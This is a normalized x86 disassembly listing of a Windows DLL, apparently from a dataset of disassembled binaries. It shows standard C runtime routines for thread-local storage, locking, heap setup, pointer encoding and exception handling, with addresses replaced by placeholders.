call sub_1000361e
add esp 0xc
pop ebp
retn
sub_10002e03
test esi esi
jne r-xdata
retn
cmp [ rw-data ] 0xffffffff
je r-xdata
call sub_10003b54
_start
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x1
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10002eb6
add esp 0xc
pop ebp
retn 0xc
call sub_1000457b
sub_10002f98
mov ecx [ ebp - 0x14 ]
mov eax [ ecx ]
push ecx
push [ eax ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10002fc4
add esp 0x14
retn
sub_1000327f
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] r--data
mov eax [ eax ]
mov [ ecx + 0x4 ] eax
mov [ ecx + 0x8 ] 0x0
mov eax ecx
pop ebp
retn 0x8
sub_100032bd
mov [ ecx ] r--data
jmp sub_1000335e
sub_1000335e
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x0
je r-xdata
and [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
pop esi
retn
push [ esi + 0x4 ]
call sub_100031b5
pop ecx
sub_1000337a
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
retn
mov eax r--data
sub_100033ad
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_10003415
push ecx
mov [ ecx ] r--data
call sub_1000528c
pop ecx
retn
sub_1000361e
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10003442
add esp 0x10
pop ebp
retn
sub_10003959
push 0xd
call sub_100051df
pop ecx
retn
sub_10003965
push 0xc
call sub_100051df
pop ecx
retn
sub_10003acc
push 0xd
call sub_100051df
pop ecx
retn
sub_10003ad5
push 0xc
call sub_100051df
pop ecx
retn
sub_10003b54
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
jmp sub_100050af
push eax
call sub_100046be
or [ rw-data ] 0xffffffff
pop ecx
sub_10003ba3
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_10003b71
pop ecx
push [ ebp + 0x8 ]
call [ ExitProcess@IAT ]
sub_10003cc9
push ebp
mov ebp esp
call sub_10004d75
push [ ebp + 0x8 ]
call sub_10004dd2
pop ecx
push 0xff
call sub_10003d85
int3
sub_10003ce5
push 0x1
push 0x0
push 0x0
call sub_10003e21
add esp 0xc
retn
sub_10003d85
push ebp
mov ebp esp
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_10003e21
add esp 0xc
pop ebp
retn
sub_10003e0f
push 0x8
call sub_1000507b
pop ecx
retn
sub_10003e18
push 0x8
call sub_100051df
pop ecx
retn
sub_10003f3b
cmp [ ebp + 0x10 ] 0x0
je r-xdata
retn
push 0x8
call sub_100051df
pop ecx
sub_10003f50
call [ GetProcessHeap@IAT ]
xor ecx ecx
test eax eax
setne cl
mov [ rw-data ] eax
mov eax ecx
retn
sub_10003f65
and [ rw-data ] 0x0
retn
sub_10004212
push 0xb
call sub_100051df
pop ecx
retn
sub_100046a0
push ebp
mov ebp esp
mov eax [ rw-data ]
xor eax [ rw-data ]
je r-xdata
pop ebp
jmp [ TlsAlloc@IAT ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_100046be
push ebp
mov ebp esp
mov eax [ rw-data ]
xor eax [ rw-data ]
push [ ebp + 0x8 ]
je r-xdata
call [ TlsFree@IAT ]
pop ebp
retn
call eax
pop ebp
retn
sub_100046dd
push ebp
mov ebp esp
mov eax [ rw-data ]
xor eax [ rw-data ]
push [ ebp + 0x8 ]
je r-xdata
call [ TlsGetValue@IAT ]
pop ebp
retn
call eax
pop ebp
retn
sub_1000499b
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
pop ebp
retn
sub_100049b0
push ebp
mov ebp esp
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push [ ebp + 0x8 ]
call [ UnhandledExceptionFilter@IAT ]
pop ebp
retn
sub_10004b35
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_100051a1
push 0xa
call sub_100051df
pop ecx
retn
sub_100051df
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rw-data ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_100052f4
push 0xe
call sub_100051df
pop ecx
retn
sub_10005420
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_1000597c
push 0xc
call sub_100051df
pop ecx
retn
sub_100059d0
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_10005d30
pop ecx
mov [ rw-data ] 0x1
sub_10005d27
push 0xd
call sub_100051df
pop ecx
retn
sub_10005ea8
push 0xd
call sub_100051df
pop ecx
retn
sub_1000615d
push 0xc
call sub_100051df
pop ecx
retn
sub_10006249
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
xor ecx ecx
cmp [ eax ] 0xc0000005
sete cl
mov eax ecx
retn
sub_1000631a
call sub_10003e18
retn
sub_100063d6
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_100062e0
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
pop ebp
retn
sub_100063eb
push esi
xor esi esi
push [ esi + rw-data ]
call [ EncodePointer@IAT ]
mov [ esi + rw-data ] eax
add esi 0x4
cmp esi 0x28
jb r-xdata
pop esi
retn
sub_1000640a
push 0x8
push r--data
call sub_10004af0
call sub_100039a4
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
call sub_10007f50
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_1000642a
xor eax eax
inc eax
retn
sub_1000642e
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10007f50
sub_1000643e
push sub_1000640a
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
retn
sub_1000644f
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_1000645c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_10006469
push [ rw-data ]
call [ DecodePointer@IAT ]
retn
sub_10006476
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
pop ebp
retn
sub_1000660d
test ebx ebx
je r-xdata
retn
push 0x0
call sub_100051df
pop ecx
sub_10006766
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_10006690
add esp 0xc
pop ebp
retn 0x4
sub_10006799
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_100082c5
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_100067cb
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_10006690
add esp 0xc
pop ebp
retn 0x8
sub_10006855
call sub_100080b5
cmp [ rw-data ] 0x0
je r-xdata
push [ rw-data ]
call sub_100031b5
and [ rw-data ] 0x0
pop ecx
retn
call sub_100082e7
sub_100069a8
push ebp
mov ebp esp
push 0x4
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_10006952
add esp 0x10
pop ebp
retn
sub_10006bab
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax [ ebp + 0x8 ]
sar eax 0x1
dec eax
pop ebp
retn
sub_10007f47
push 0x2
call sub_10003cc9
sub_100080b5
push 0x1
call sub_100080be
pop ecx
retn
sub_10008166
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_10006925
pop ecx
pop ecx
retn
sub_10008199
push 0x1
call sub_100051df
pop ecx
retn
sub_10008299
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_100081d0
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_100082e4
call eax
retn
sub_1000837b
push 0x1
call sub_100051df
pop ecx
retn
sub_10008590
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0xf
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_100090a0
sub_100085a6
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_100090a0
sub_10008681
push edi
call sub_10009244
pop ecx
retn
sub_1000875b
push esi
call sub_10009244
pop ecx
retn
sub_10009089
push esi
call sub_100068eb
pop ecx
retn
sub_1000914e
push 0xa
call sub_100051df
pop ecx
retn
sub_100092a0
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_1000926a
pop ecx
pop ecx
pop ebp
retn
sub_10009415
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10009322
add esp 0x10
pop ebp
retn
sub_1000950f
push esi
call sub_10009244
pop ecx
retn
sub_10009602
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
retn
cmp eax 0xfffffffe
je r-xdata
push eax
call [ CloseHandle@IAT ]
sub_10009619
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x3
push 0x40000000
push r--data
call [ CreateFileW@IAT ]
mov [ rw-data ] eax
retn
IsProcessorFeaturePresent
jmp [ IsProcessorFeaturePresent@IAT ]
RtlUnwind
jmp [ RtlUnwind@IAT ]
